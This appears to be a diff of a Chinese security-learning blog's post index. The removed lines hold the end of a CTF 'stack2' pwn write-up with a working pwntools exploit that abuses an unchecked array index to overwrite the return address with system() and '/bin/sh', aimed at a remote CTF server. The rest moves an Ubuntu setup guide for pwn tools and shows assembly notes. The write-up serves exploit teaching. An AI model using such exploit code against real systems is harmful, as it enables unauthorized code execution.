-<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
-<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
-<p>3.做题首先运行一下，查看程序的运行过程</p>
-<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
-<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
-<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
-<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
-<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
-<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
-<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
-<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
-<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
-<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
-<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
-<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
-<pre><code>#!/usr/bin/python
-#coding:utf-8
-
-from pwn import*
-
-
-
-
-
-
-system_addr=0x080485AF
-leave_offset=0x84
-
-
-def write_addr(addr,va):
-    io.sendline(&quot;3&quot;)
-    io.recvuntil(&quot;which number to change:\n&quot;)
-    io.sendline(str(addr))
-    io.recvuntil(&quot;new number:\n&quot;)
-    io.sendline(str(va))
-    io.recvuntil(&quot;5. exit\n&quot;)
-
-io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
-io.recvuntil(&quot;How many numbers you have:\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;Give me your numbers\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;5. exit\n&quot;)
-
-
-# write  system_addr  0x08048450
-
-write_addr(leave_offset,0X50)
-write_addr(leave_offset+1,0X84)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-# sh_addr  0x08048987
-leave_offset+=8
-print leave_offset
-write_addr(leave_offset,0x87)
-write_addr(leave_offset+1,0X89)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-
-io.sendline(&quot;5&quot;)
-io.interactive()    </code></pre>]]></content>
-      <tags>
-        <tag>做题题解</tag>
       </tags>
   </entry>
   <entry>
@@ -535,6 +535,48 @@ esp  </code></pre><p>待更新。。</p>
 ]]></content>
       <tags>
         <tag>有关栈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu16.04配置</title>
+    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
+<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
+<p>#拍快照</p>
+<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
+<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
+<p>如果提示 的是 路径， 则直接回车就好。</p>
+<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
+<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
+<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
+https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
+https://www.cnblogs.com/flyinggod/p/7979108.html
+不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+
+解决问题E: Could not get lock /var/lib/apt/lists/lock
+https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<pre><code>安装：  sudo apt install python-pip
+
+遇到问题，    
+        Unable to locate package python-pip
+解决方法： 更新软件源
+        sudo apt-get update
+
+网址    https://www.jianshu.com/p/568aab038d4c
+    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
+<pre><code>sudo mkdir ~/.pip/
+cd ./.pip/
+touch pip.conf
+sudo gedit pip.conf 
+
+网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
+        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
+<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
       </tags>
   </entry>
   <entry>
@@ -614,48 +656,6 @@ esp  </code></pre><p>待更新。。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：</span><br><span class="line"><span class="number">1.</span>  zf=<span class="number">1</span> ===&gt; (ax)=(bx)</span><br><span class="line"><span class="number">2.</span>  zf=<span class="number">0</span> ===&gt; (ax)!=(bx)</span><br><span class="line"><span class="number">3.</span>  cf=<span class="number">1</span> ===&gt; (ax)&lt;(bx)</span><br><span class="line"><span class="number">4.</span>  cf=<span class="number">0</span> ===&gt; (ax)&gt;=(bx)</span><br><span class="line"><span class="number">5.</span>  cf=zf=<span class="number">0</span> ===&gt; (ax)&gt;(bx)</span><br><span class="line"><span class="number">6.</span>  cf=<span class="number">1</span>或zf=<span class="number">1</span> ===&gt; (ax)&lt;=(bx)</span><br><span class="line">cmp指令的比较结果需要通过条件转移指令来检测。</span><br><span class="line">|指令 |解释 |含义 |检测的相关标志位|</span><br><span class="line">|-------|-------|-------|----------------|</span><br><span class="line">|je|e:equal|等于则转移|zf=<span class="number">1</span>|</span><br><span class="line">|jne|ne:<span class="keyword">not</span> equal|不等于则转移|zf=<span class="number">0</span>|</span><br><span class="line">|jb|b:below|低于则转移|cf=<span class="number">1</span>|</span><br><span class="line">|jnb|nb:<span class="keyword">not</span> below| 不低于则转移| cf=<span class="number">0</span>|</span><br><span class="line">|ja |a:above| 高于则转移| cf=<span class="number">0</span>且zf=<span class="number">0</span>|</span><br><span class="line">|jna| na:<span class="keyword">not</span> above| 不高于则转移| cf=<span class="number">1</span>或zf=<span class="number">1</span>|</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
         <tag>pwn学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu16.04配置</title>
-    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
-<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
-<p>#拍快照</p>
-<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
-<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
-<p>如果提示 的是 路径， 则直接回车就好。</p>
-<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
-<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
-<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
-https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
-https://www.cnblogs.com/flyinggod/p/7979108.html
-不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
-
-解决问题E: Could not get lock /var/lib/apt/lists/lock
-https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<pre><code>安装：  sudo apt install python-pip
-
-遇到问题，    
-        Unable to locate package python-pip
-解决方法： 更新软件源
-        sudo apt-get update
-
-网址    https://www.jianshu.com/p/568aab038d4c
-    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
-<pre><code>sudo mkdir ~/.pip/
-cd ./.pip/
-touch pip.conf
-sudo gedit pip.conf 
-
-网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
-        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
-<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
       </tags>
   </entry>
   <entry>
